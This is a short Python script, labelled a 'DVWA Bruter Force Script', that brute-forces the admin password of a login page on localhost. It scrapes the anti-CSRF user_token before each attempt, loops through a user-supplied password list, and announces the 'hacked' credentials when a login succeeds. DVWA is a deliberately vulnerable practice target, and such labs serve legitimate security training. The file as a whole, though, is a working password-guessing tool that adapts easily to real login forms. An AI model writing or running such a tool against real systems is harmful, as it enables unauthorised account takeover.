import requests
from bs4 import BeautifulSoup
import sys
headers = {
    'Host': 'localhost',
    'Content-Length': '88',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="97", " Not;A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://localhost',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'http://localhost/login.php',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}


class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'


def login(username , password):
	try:
		s = requests.Session()

		response = s.get('http://localhost/login.php', headers=headers, verify=False)

		soup = BeautifulSoup(response.text , 'lxml')
		token= (soup.find("input", {'name': "user_token"}).attrs['value'])
		payload = {'username':username , 'password':password , 'Login':'Login' ,  'user_token':token}
		r = s.post('http://localhost/login.php', headers=headers, data=payload , verify=False)
		if 'Welcome' in r.text:
			
			print('*' * 99)
			snake = u"\U0001F480" * 15
			print(style.RED+f'Hacked username is {username} , password is {password} {snake}')
			print('*' * 99)
			sys.exit()
		else:
			print(style.GREEN+'#' * 80)
			snake = u"\U0001F40D"
			print(style.CYAN+ f"sorry Wrong pass. {snake} {password}")
			print(style.GREEN+'#' * 80)

	except Exception as e:
		print('Error' , e)





if __name__ == '__main__':
	try:
		print(style.BLUE)
		print(style.GREEN +' DVWA Bruter Force Script Codded By Eng Yazeed ')
		file = input(' enter Password List path : ')
	except:
		print('password list Plz .')
		pass

	with open(file , 'r') as f:
		for line in f:

			login('admin', line.rstrip())
